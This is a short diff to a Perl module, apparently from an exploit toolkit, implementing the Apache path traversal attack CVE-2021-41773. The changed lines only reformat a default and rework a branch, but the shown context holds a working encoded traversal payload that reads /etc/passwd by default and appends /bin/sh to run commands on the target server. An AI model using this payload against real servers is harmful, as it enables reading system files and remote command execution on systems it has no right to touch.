@@ -22,7 +22,9 @@ package Spellbook::Advisory::CVE_2021_41773 {
                 $target = "https://$target";
             }
             
-            if (!$file) { $file = "/etc/passwd"; }
+            if (!$file) {
+                $file = "/etc/passwd";
+            }
 
             my $payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/";
 
@@ -30,7 +32,7 @@ package Spellbook::Advisory::CVE_2021_41773 {
                 $payload = $payload . "/bin/sh";
             }
 
-            else {
+            if (!$command) {
                 $payload = $payload . $file;
             }
 
